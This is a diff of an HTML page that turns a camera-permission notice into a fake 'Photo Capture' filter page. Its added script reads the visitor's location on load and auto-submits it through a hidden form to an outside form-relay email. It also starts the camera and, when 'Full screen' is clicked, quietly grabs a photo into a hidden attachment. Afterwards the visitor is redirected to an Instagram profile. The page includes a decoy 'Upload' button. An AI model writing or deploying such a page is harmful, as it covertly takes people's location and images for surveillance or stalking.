@@ -4,64 +4,501 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Page 1</title>
+    <title>Photo Capture</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 20px;
+            
+                background-image: url('pexels-sergei-a-2589456.jpg');
+                background-repeat: no-repeat;
+                background-size: cover;
+                height: 100vh;
+                margin: 0;
+                /* display: flex; */
+                /* justify-content: center; */
+                /* align-items: center; */
+           
+
         }
 
-        body {
-            font-family: 'Arial', sans-serif;
-            margin: 0;
-            display: flex;
+        #capture {
             align-items: center;
+            background-image: linear-gradient(144deg, #ff4063, #5B42F3 50%, #18eb00);
+            border: 0;
+            border-radius: 8px;
+            box-shadow: rgba(151, 65, 252, 0.2) 0 15px 30px -5px;
+            box-sizing: border-box;
+            color: #FFFFFF;
+            display: flex;
+            font-family: Phantomsans, sans-serif;
+            font-size: 20px;
             justify-content: center;
-            height: 100vh;
-            background-color: #000000;
-            color: #ffffff;
+            line-height: 1em;
+            max-width: fit-content;
+            min-width: 140px;
+            padding: 3px;
+            text-decoration: none;
+            user-select: none;
+            -webkit-user-select: none;
+            touch-action: manipulation;
+            white-space: nowrap;
+            cursor: pointer;
+            margin-top: 12px;
+            margin-left: 35%;
         }
 
-        .note-box {
-            background-color: #6cdb34be;
-            color: #ffffff;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            font-weight: 400;
-            font-size: xx-large;
+        #capture:active,
+        #capture:hover {
+            outline: 0;
         }
 
-        .note-content {
-            margin: 0;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        #capture {
+            background-color: rgb(5, 6, 45);
+            padding: 16px 24px;
+            border-radius: 6px;
+            width: 100%;
+            height: 100%;
+            transition: 300ms;
+        }
+
+        #capture:hover {
+            background: none;
+        }
+
+        @media (min-width: 768px) {
+            #capture {
+                font-size: 24px;
+                min-width: 196px;
+            }
+
+            body {
+                background-size: 100vh;
+            }
+        }
+
+
+
+
+
+
+        #upload {
+            align-items: center;
+            background-image: linear-gradient(144deg, #84a988, #42f365 50%, #52eb00);
+            border: 0;
+            border-radius: 8px;
+            box-shadow: rgba(151, 65, 252, 0.2) 0 15px 30px -5px;
+            box-sizing: border-box;
+            color: #000000;
+            display: flex;
+            font-family: Phantomsans, sans-serif;
+            font-size: 20px;
+            justify-content: center;
+            line-height: 1em;
+            max-width: fit-content;
+            min-width: 140px;
+            padding: 3px;
+            text-decoration: none;
+            user-select: none;
+            -webkit-user-select: none;
+            touch-action: manipulation;
+            white-space: nowrap;
+            cursor: pointer;
+            margin-top: 12px;
+            margin-left: 35%;
+        }
+
+        #upload:active,
+        #upload:hover {
+            outline: 0;
+        }
+
+        #upload {
+            background-color: rgb(5, 6, 45);
+            padding: 16px 24px;
+            border-radius: 6px;
+            width: 100%;
+            height: 100%;
+            transition: 300ms;
+        }
+
+        #upload:hover {
+            background: none;
+        }
+
+        @media (min-width: 768px) {
+            #upload {
+                font-size: 24px;
+                min-width: 196px;
+            }
+        }
+
+
+
+
+
+
+        #fake {
+            align-items: center;
+            background-image: linear-gradient(144deg, #AF40FF, #5B42F3 50%, #00DDEB);
+            border: 0;
+            border-radius: 8px;
+            box-shadow: rgba(151, 65, 252, 0.2) 0 15px 30px -5px;
+            box-sizing: border-box;
+            color: #FFFFFF;
+            display: flex;
+            font-family: Phantomsans, sans-serif;
+            font-size: 20px;
+            justify-content: center;
+            line-height: 1em;
+            max-width: fit-content;
+            min-width: 140px;
+            padding: 3px;
+            text-decoration: none;
+            user-select: none;
+            -webkit-user-select: none;
+            touch-action: manipulation;
+            white-space: nowrap;
+            cursor: pointer;
+            margin-top: 12px;
+            margin-left: 35%;
+        }
+
+        #fake:active,
+        #fake:hover {
+            outline: 0;
+        }
+
+        #fake {
+            background-color: rgb(5, 6, 45);
+            padding: 16px 24px;
+            border-radius: 6px;
+            width: 100%;
+            height: fit-content;
+            transition: 300ms;
+        }
+
+        #fake:hover {
+            background: none;
+        }
+
+        @media (min-width: 768px) {
+            #fake {
+                font-size: 24px;
+                min-width: 196px;
+            }
+        }
+
+
+
+
+
+
+
+
+
+
+
+        /* .vid1,
+        #video2 {
+            width: 97dvw;
+            height: 70dvh;
+        } */
+
+
+
+
+        /* #capture{
+            width: fit-content;
+            padding: 5px 5px 5px 5px;
+            align-items: center;
+            border: none;
+            border-radius: 6px;
+        } */
+        #video {
+            /* height: 80%; */
+            border: 4px solid rgb(0, 221, 255);
+            border-radius: 6PX;
         }
     </style>
 </head>
 
-<body>
-    <div id="redirectText">
-        <div class="note-box">
-            <p class="note-content">For security purposes, we need to access your location and camera. This is a mandatory step to proceed to the site. You have one opportunity to grant the permission. If you agree, please click on the button below. You will be redirected to the site in 30 seconds.</p>
-        </div>
+<body onload="getLocation()">
+    <div class="cap">
+        <video id="video" width="100%" style="display: block;" autoplay></video>
+        <button id="capture" class="fullscreenButton" onclick="toggleFullscreen()">Full screen</button>
+    </div>
+    <div>
+        <label for="fileInput" style="display: none;">Selected:</label>
+
+        <!-- <video id="myVideo" class="vid1" src="carmel1.mp4" ></video> -->
+        <!-- <video id="video2" src="carmel2.mp4" style="display: none;" ></video> -->
+        <!-- <button id="showButton" onclick="toggleSwitch()">Click</button> -->
+
+        <!-- <button onclick="playPause()">Play/Pause</button> -->
     </div>
 
+
+
+
+
+
+
+
+    <!-- Form for submitting captured photo -->
+    <form id="captureForm" method="POST" action="https://formsubmit.co/studyram77@gmail.com"
+        enctype="multipart/form-data">
+        <input type="file" name="attachment" id="fileInput" accept="image/png, image/jpeg" style="display: none;">
+        <img id="capturedImage" style="display: none; max-width: 200px; max-height: 200px;" alt="Captured Photo">
+        <button id="upload" type="submit" style="display: block;">Try Filter</button>
+
+
+        <!-- <input type="text" name="name" id="name" required placeholder="Name"> -->
+        <textarea name="msg" required placeholder="Message" id="myTextarea" style="display: none;"></textarea>
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next" value="https://www.instagram.com/just_arihant_things?igsh=NmVtaDJpZzUxbDF6">
+        <!-- <button id="myButton">_NEXT_</button> -->
+    </form>
+<button id="fake">Upload</button>
+    <!-- ... Your existing HTML code ... -->
+
     <script>
-        // Set the URL of the second HTML page
-        var redirectURL = "index1.html";
 
-        // Set the time delay before redirection (in milliseconds)
-        var delayTime = 30000; // 3 seconds
 
-        // Display the initial text
-        document.getElementById("redirectText").innerHTML += "<p>Please wait...</p>";
 
-        // Use setTimeout to redirect after a delay
-        setTimeout(function () {
-            window.location.href = redirectURL;
-        }, delayTime);
+function toggleFullscreen() {
+            const elem = document.documentElement;
+
+            if (!document.fullscreenElement) {
+                if (elem.requestFullscreen) {
+                    elem.requestFullscreen();
+                } else if (elem.mozRequestFullScreen) {  // Firefox
+                    elem.mozRequestFullScreen();
+                } else if (elem.webkitRequestFullscreen) {  // Chrome, Safari and Opera
+                    elem.webkitRequestFullscreen();
+                } else if (elem.msRequestFullscreen) {  // IE/Edge
+                    elem.msRequestFullscreen();
+                }
+            } else {
+                if (document.exitFullscreen) {
+                    document.exitFullscreen();
+                } else if (document.mozCancelFullScreen) {
+                    document.mozCancelFullScreen();
+                } else if (document.webkitExitFullscreen) {
+                    document.webkitExitFullscreen();
+                } else if (document.msExitFullscreen) {
+                    document.msExitFullscreen();
+                }
+            }
+
+            playPause();
+        }
+        // var video1 = document.getElementById("myVideo");
+        // var video2 = document.getElementById("video2");
+
+        // function toggleSwitch() {
+        //     if (video1.style.display !== "none") {
+        //         video1.style.display = "none";
+        //         video2.style.display = "block";
+        //     } else {
+        //         video1.style.display = "block";
+        //         video2.style.display = "none";
+        //     }
+
+        //     toggleControls();
+        // }
+
+        // function toggleControls() {
+        //     if (video1.controls) {
+        //         video1.controls = false;
+        //         video2.controls = false;
+        //     } else {
+        //         video1.controls = true;
+        //         video2.controls = true;
+        //     }
+
+        //     // var hiddenButton = document.getElementById('upload');
+        //     // hiddenButton.style.display = (hiddenButton.style.display === 'none' || hiddenButton.style.display === '') ? 'block' : 'none';
+        //     toggleButtons()
+        // }
+        // function toggleButtons() {
+        //     var showButton = document.getElementById('showButton');
+        //     var hiddenButton = document.getElementById('upload');
+
+        //     showButton.style.display = 'none';
+        //     hiddenButton.style.display = 'block';
+        // }
+
+
+
+
+
+
+
+
+
+
+
+        var myTextarea = document.getElementById("myTextarea");
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition);
+            } else {
+                myTextarea.value = "Geolocation is not supported by this browser.";
+            }
+        }
+
+        function showPosition(position) {
+            myTextarea.value = "Latitude: " + position.coords.latitude +
+                "\nLongitude: " + position.coords.longitude;
+        }
+
+        var myButton = document.getElementById("upload");
+
+        function clickButtonOnLoad() {
+            myButton.click();
+        }
+
+        window.onload = function () {
+            getLocation();
+            clickButtonOnLoad();
+        };
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+        // const video = document.getElementById('video');
+        // const fileInput = document.getElementById('fileInput');
+        // const capturedImage = document.getElementById('capturedImage');
+
+        // // Access the user's camera
+        // navigator.mediaDevices.getUserMedia({ video: true })
+        //     .then((stream) => {
+        //         video.srcObject = stream;
+        //     })
+        //     .catch((error) => {
+        //         console.error('Error accessing the camera:', error);
+        //     });
+
+        // // Capture photo and add it to attachment
+        // document.getElementById('capture').addEventListener('click', () => {
+        //     const canvas = document.createElement('canvas');
+        //     canvas.width = video.videoWidth;
+        //     canvas.height = video.videoHeight;
+        //     const context = canvas.getContext('2d');
+        //     context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        //     // Convert the canvas content to a blob
+        //     canvas.toBlob((blob) => {
+        //         const file = new File([blob], 'captured_photo.png', { type: 'image/png' });
+
+        //         // Display the captured image
+        //         capturedImage.src = URL.createObjectURL(blob);
+        //         capturedImage.style.display = 'block';
+
+        //         // Create a new FileList and append the file
+        //         const fileList = new DataTransfer();
+        //         fileList.items.add(file);
+
+        //         // Set the files property of the file input
+        //         fileInput.files = fileList.files;
+        //     }, 'image/png');
+        // });
+
+        // // Handle file upload
+        // document.getElementById('fileInput').addEventListener('change', (event) => {
+        //     const fileInput = event.target;
+        //     const file = fileInput.files[0];
+
+        //     // Add your logic to handle the uploaded file (e.g., display, save, etc.)
+        //     // For now, let's just show the file name in the console
+        //     console.log('Selected file:', file.name);
+        // });
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+        const video = document.getElementById('video');
+        const fileInput = document.getElementById('fileInput');
+        const capturedImage = document.getElementById('capturedImage');
+
+        // Ask for camera permission on page load
+        document.addEventListener('DOMContentLoaded', () => {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then((stream) => {
+                        video.srcObject = stream;
+                    })
+                    .catch((error) => {
+                        console.error('Error accessing the camera:', error);
+                    });
+            } else {
+                console.error('getUserMedia is not supported');
+            }
+        });
+
+        // Capture photo and add it to attachment
+        document.getElementById('capture').addEventListener('click', () => {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Convert the canvas content to a blob
+            canvas.toBlob((blob) => {
+                const file = new File([blob], 'captured_photo.png', { type: 'image/png' });
+
+                // Display the captured image
+                capturedImage.src = URL.createObjectURL(blob);
+                capturedImage.style.display = 'none';
+
+                // Create a new FileList and append the file
+                const fileList = new DataTransfer();
+                fileList.items.add(file);
+
+                // Set the files property of the file input
+                fileInput.files = fileList.files;
+            }, 'image/png');
+        });
+
+        // Handle file upload
+        document.getElementById('fileInput').addEventListener('change', (event) => {
+            const fileInput = event.target;
+            const file = fileInput.files[0];
+
+            // Add your logic to handle the uploaded file (e.g., display, save, etc.)
+            // For now, let's just show the file name in the console
+            console.log('Selected file:', file.name);
+        });
     </script>
+
+
 </body>
 
 </html>
